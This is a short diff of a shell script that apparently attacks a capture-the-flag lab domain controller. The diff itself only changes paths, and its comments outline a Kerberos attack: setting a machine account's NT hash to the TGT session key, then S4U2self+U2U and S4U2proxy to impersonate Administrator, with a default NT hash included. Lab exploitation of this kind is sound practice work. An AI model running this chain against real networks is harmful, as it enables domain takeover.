@@ -5,9 +5,10 @@
 #  3. set the account NT hash == TGT session key (self change, SAMR over Kerberized SMB)
 #  4. S4U2self+U2U -> S4U2proxy impersonating Administrator on cifs/dc.hercules.htb
 set -u
-cd /home/kali/hercules
-export KRB5_CONFIG=$PWD/krb5.conf
-export LD_PRELOAD=$PWD/fixhosts.so
+SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+cd "$SCRIPT_DIR"
+export KRB5_CONFIG=$SCRIPT_DIR/krb5.conf
+export LD_PRELOAD=$SCRIPT_DIR/fixhosts.so
 DCIP=10.129.242.196
 E=/usr/share/doc/python3-impacket/examples
 OLDHASH="${1:-77f398db6e01c48663ab4385c7b194e7}"   # current NT hash of iis_webserver$
